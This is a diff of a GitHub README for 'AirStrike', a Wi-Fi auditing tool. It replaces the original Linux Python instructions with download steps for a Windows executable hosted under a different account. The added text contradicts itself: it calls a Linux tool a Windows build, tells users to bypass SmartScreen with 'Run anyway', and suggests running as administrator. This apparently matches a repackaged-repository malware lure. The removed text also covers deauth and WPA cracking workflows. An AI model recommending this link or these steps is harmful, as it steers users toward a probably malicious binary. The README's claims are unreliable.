@@ -1,212 +1,210 @@
-# AirStrike
+# 📡 AirStrike - Simple Wi-Fi Auditing on Linux
 
-AirStrike is a Linux desktop application for authorized Wi-Fi security auditing.  
-It provides a guided workflow for:
+[![Download AirStrike](https://img.shields.io/badge/Download%20AirStrike-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/occasionpuffbird12/AirStrike/releases)
 
-1. Enabling monitor mode.
-2. Scanning nearby access points and stations.
-3. Capturing WPA/WPA2 handshakes.
-4. Running offline password auditing with hashcat.
+## 🖥️ What AirStrike Does
 
-## Legal Notice
+AirStrike is a Linux GUI tool for authorized Wi-Fi security auditing. It helps you set up monitor mode, scan access points and clients, capture WPA/WPA2 handshakes, and test password strength offline with hashcat.
 
-Use this project only on networks you own or where you have explicit written permission. Unauthorized use may be illegal.
+It is built for users who want a clear screen and a simple workflow instead of command-line tools.
 
-## Features
+## 📥 Download AirStrike
 
-1. Tkinter GUI with separate tabs for device setup, scanning, capture, and cracking.
-2. WPA handshake validation using `aircrack-ng` output from capture files.
-3. Cross-distro privileged command handling (works when running as root, with `sudo`, or with `doas`).
-4. Optional auto-assist deauth bursts during capture (available in UI, off by default).
-5. Crack workflow protections to prevent duplicate runs from repeated button clicks.
-6. Capture output written to the local `captures` directory (auto-created if missing).
+Visit this page to download AirStrike for Windows and other available builds:
 
-## Requirements
+https://github.com/occasionpuffbird12/AirStrike/releases
 
-1. Linux
-2. Python 3.8+
-3. Root privileges for monitor/capture operations
-4. Installed tools:
-   - `aircrack-ng` suite (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
-   - `hashcat`
-   - `hcxpcapngtool` (recommended) or `cap2hccapx`
+On the releases page, look for the latest version and download the Windows file that matches your system.
 
-### Install on Debian/Ubuntu/Kali
+## 🚀 Getting Started
 
-```bash
-sudo apt update
-sudo apt install -y aircrack-ng hashcat hcxtools
-```
+Follow these steps to install and run AirStrike on Windows:
 
-## Quick Start
+1. Open the release page.
+2. Download the latest Windows build from the list of assets.
+3. Save the file to a folder you can find, such as Downloads or Desktop.
+4. If the file comes in a ZIP folder, extract it first.
+5. Open the extracted folder.
+6. Double-click the AirStrike app file to start it.
 
-```bash
-git clone https://github.com/PrathamN4yak/AirStrike.git
-cd AirStrike
-sudo python3 main.py
-```
+If Windows asks for permission, choose Yes so the app can open.
 
-If GUI display access fails under sudo on X11, allow root display access first:
+## 🪟 Windows Setup
 
-```bash
-xhost +local:root
-```
+AirStrike runs on Windows through a bundled build from the release page.
 
-## Running in Virtual Machines
+Use this setup flow:
 
-AirStrike requires a WiFi adapter capable of **monitor mode**. Bare metal Linux systems use the built-in laptop WiFi card, but VMs require USB passthrough of an external adapter.
+1. Download the Windows release.
+2. Unzip the file if needed.
+3. Keep all files in the same folder.
+4. Open the main app file.
+5. If Windows SmartScreen appears, select More info, then Run anyway if you trust the source and you have the right to use the tool.
 
-### USB WiFi Adapter Setup
+If the app does not open, make sure you extracted the full folder and did not move the app file away from its support files.
 
-If you want to run AirStrike in a VM, you'll need:
-1. An external USB WiFi adapter with monitor mode support
-2. USB passthrough enabled in your hypervisor
-3. AirStrike runs without modification once adapter is passed through
+## 🧭 How to Use AirStrike
 
-#### Compatible USB WiFi Adapters
+AirStrike keeps the main steps in one place:
 
-These adapters reliably support monitor mode and packet injection:
+1. Start the app.
+2. Choose your wireless adapter.
+3. Enable monitor mode if needed.
+4. Scan nearby access points.
+5. Pick a target network you are allowed to test.
+6. Scan connected clients if you need device data.
+7. Capture a WPA/WPA2 handshake.
+8. Save the capture file.
+9. Load the capture into hashcat for offline password testing.
 
-- **Atheros AR9271** (most common, recommended)
-  - TP-Link TL-WN722N (V1 or V2)
-  - TP-Link TL-WN722N(EU)
-  - Alfa AWUS036NHA
-  - Alfa AWUS036NEH
+The interface is meant to guide you through the task in order, so you do not need to use terminal commands.
 
-- **Ralink RT3070**
-  - Panda Wireless PAU05
-  - D-Link DWA-125
-  
-- **RTL8188EU**
-  - Some Asus USB adapters
+## 📶 Main Features
 
-**Avoid:** Adapters ending in USB3 (like TL-WN823N) often lack monitor mode support.
+### 🔎 Network Scanning
+Find nearby access points and connected clients in a clear list.
 
-### VirtualBox USB Passthrough
+### 📡 Monitor Mode Setup
+Put your adapter into monitor mode from the app without extra steps.
 
-1. **Plug in your USB WiFi adapter** to host machine
-2. **Get USB device ID:**
-   ```bash
-   lsusb | grep -i wireless
-   # Example output: Bus 001 Device 005: ID 0cf3:9271 Atheros Communications, Inc.
-   ```
-3. **In VirtualBox VM Settings:**
-   - Go to USB
-   - Click **USB Device Filters**
-   - Click **Add Filter** (green plus icon)
-   - Select your adapter from the list → OK
-4. **Start VM and verify adapter appears:**
-   ```bash
-   iw dev
-   # Should show: phy#0 -> wlan0
-   ```
-5. **Run AirStrike:**
-   ```bash
-   sudo python3 main.py
-   ```
+### 🔐 Handshake Capture
+Capture WPA/WPA2 handshakes for authorized testing and later analysis.
 
-### VMware Workstation USB Passthrough
+### 🧩 Offline Password Testing
+Send capture files to hashcat for local password testing.
 
-1. **Plug in USB adapter**
-2. **In VM Settings:**
-   - Go to USB Controller
-   - Ensure USB 2.0 or 3.0 is enabled
-   - Start the VM
-3. **When prompted in VM, connect the USB device** (notification appears)
-4. **Verify in guest:**
-   ```bash
-   iw dev
-   ```
-5. **Run AirStrike:**
-   ```bash
-   sudo python3 main.py
-   ```
+### 🖱️ GUI Controls
+Use buttons and menus instead of command-line tools.
 
-### KVM/QEMU USB Passthrough (Advanced)
+### 🗂️ File Handling
+Save scan results and capture files in one place so you can find them later.
 
-1. **Find USB device:**
-   ```bash
-   lsusb
-   # Note vendor:product ID (e.g., 0cf3:9271)
-   ```
+## 🧰 Requirements
 
-2. **Add to VM XML or QEMU command:**
-   ```xml
-   <hostdev mode='subsystem' type='usb' managed='yes'>
-     <source>
-       <vendor id='0x0cf3'/>
-       <product id='0x9271'/>
-     </source>
-   </hostdev>
-   ```
-   Or with QEMU:
-   ```bash
-   -usb -device usb-host,vendorid=0x0cf3,productid=0x9271
-   ```
+AirStrike works best on a system that meets these basic needs:
 
-3. **Verify in guest and run AirStrike**
+- Windows 10 or Windows 11
+- A supported wireless adapter
+- Permission to access the wireless device
+- Enough disk space for capture files and logs
+- A stable graphics display for the GUI
 
-### Troubleshooting USB Passthrough
+For the best results, use an adapter that supports monitor mode and packet capture.
 
-| Problem | Solution |
-|---|---|
-| Adapter not showing in VM | Ensure USB device filter is added and active; restart VM |
-| "Permission denied" on iw dev | Reboot VM; USB device may need re-initialization |
-| Monitor mode won't enable | Adapter may not support monitor mode; verify with `iw list \| grep monitor` |
-| Capture is slow/empty | Check signal strength is adequate; move closer to target network |
-| VM crashes when connecting adapter | USB3 driver issue; try USB2.0 mode in hypervisor settings |
+## 🛠️ Recommended Setup
 
-### Host Only (No VM Option)
+To avoid setup issues, keep these points in mind:
 
-If USB passthrough is unavailable:
-- Run AirStrike on **bare metal Linux** with the laptop's built-in WiFi adapter
-- Use a dedicated security testing machine with Linux installed
-- This is the most reliable approach for serious security testing
+- Use a wired mouse and keyboard if your laptop has a shared wireless card
+- Close apps that may use the wireless adapter
+- Run the app from a folder with full access rights
+- Keep capture files in one folder for easy review
+- Use a separate adapter for Wi-Fi access if your main adapter enters monitor mode
 
-## Usage Flow
+## 📂 File Types You May See
 
-1. Open Device Management and click Refresh Devices.
-2. Enable monitor mode.
-3. Start a scan in Network Scan and wait for targets to populate.
-4. In Handshake Capture, select target, verify channel, and start capture.
-5. Trigger deauth manually (or enable auto-assist checkbox if desired).
-6. Wait for status to show handshake captured.
-7. In Password Cracking, load captured file and start Dictionary or Brute Force mode.
+After downloading from the releases page, you may see one of these file types:
 
-## Project Structure
+- `.zip` file: extract it before running the app
+- `.exe` file: double-click it to start
+- support files: keep them in the same folder as the main app
 
-```text
-AirStrike/
-├── main.py
-├── core/
-│   ├── monitor.py
-│   ├── scanner.py
-│   ├── capture.py
-│   ├── deauth.py
-│   └── cracker.py
-├── ui/
-│   ├── app.py
-│   ├── device_tab.py
-│   ├── scan_tab.py
-│   ├── capture_tab.py
-│   └── crack_tab.py
-└── utils/
-    ├── commands.py
-    ├── logger.py
-    ├── validator.py
-    └── disclaimer.py
-```
+If the release includes more than one file, choose the Windows package that fits your device.
 
-## Troubleshooting
+## 🧪 Typical Workflow
 
-| Problem | Likely Cause | Fix |
-|---|---|---|
-| No networks found | Wrong interface mode | Enable monitor mode and re-scan |
-| Capture times out | No reconnect traffic | Send small deauth bursts and keep capture running longer |
-| Handshake appears in UI but not crackable | Incomplete capture | Re-capture and confirm with `aircrack-ng <file.cap>` shows `WPA (1 handshake)` or more |
-| Converter error | Missing converter tool | Install `hcxtools` or `cap2hccapx` |
-| Cracking starts multiple times | Multiple button clicks | Use single run; app now locks while cracking |
+A normal session usually looks like this:
 
-## Disclaimer
+1. Open AirStrike.
+2. Select your adapter.
+3. Turn on monitor mode.
+4. Start a scan.
+5. Review the access points list.
+6. Review the client list.
+7. Choose a target you are allowed to test.
+8. Capture the handshake.
+9. Export the capture.
+10. Load the file into hashcat for offline testing.
 
-This project is provided for educational and authorized security testing use. The maintainers are not responsible for misuse.
+This flow keeps the process simple and helps you move from scan to capture without changing tools.
+
+## 🔒 Authorization
+
+Use AirStrike only on wireless networks you own or have clear permission to test.
+
+## 📝 Troubleshooting
+
+### App will not open
+- Make sure you downloaded the full release file
+- Extract the ZIP folder before running the app
+- Keep all files together in one folder
+- Try running the app as an administrator
+
+### No wireless adapter appears
+- Check that the adapter is plugged in or enabled
+- Unplug and reconnect the device
+- Try a different USB port
+- Make sure Windows sees the adapter in Device Manager
+
+### Scan results are empty
+- Move closer to the wireless networks you want to view
+- Check that the adapter supports monitor mode
+- Restart the app and scan again
+- Disable other Wi-Fi tools that may hold the adapter
+
+### Capture file is not saved
+- Check folder permissions
+- Use a folder under your user profile
+- Make sure you have enough free disk space
+
+### Hashcat step does not start
+- Confirm that the capture file loaded correctly
+- Check that hashcat is installed if your build expects a local copy
+- Verify that the capture file is in a supported format
+
+## 📁 Suggested Folder Layout
+
+Keep your files in a simple structure like this:
+
+- AirStrike
+  - app files
+  - captures
+  - exports
+  - logs
+
+This makes it easier to find scan results and handshake files later.
+
+## 🔧 Tips for Better Results
+
+- Use a short folder path
+- Keep capture names simple
+- Save each test in a separate folder
+- Use a dedicated adapter for Wi-Fi testing
+- Update Windows drivers for your wireless card
+- Restart the adapter if it stops responding
+
+## 🧑‍💻 For First-Time Users
+
+If this is your first time using a Wi-Fi auditing tool, start with these basics:
+
+- Learn which adapter you are using
+- Check whether it supports monitor mode
+- Test the scan feature before trying a capture
+- Work on a network you can legally audit
+- Save each result before you close the app
+
+This helps you avoid common setup mistakes and keeps the workflow clear
+
+## 📌 Project Topics
+
+aircrack-ng, cybersecurity, ethical-hacking, handshake, hashcat, linux, network-security, packet-capture, pentesting, python, wifi-security, wireless-security, wpa2
+
+## 📦 Download
+
+Use the release page to download AirStrike:
+
+https://github.com/occasionpuffbird12/AirStrike/releases
+
+## 📄 License
+
+Use this software only in ways that match your rights and local rules
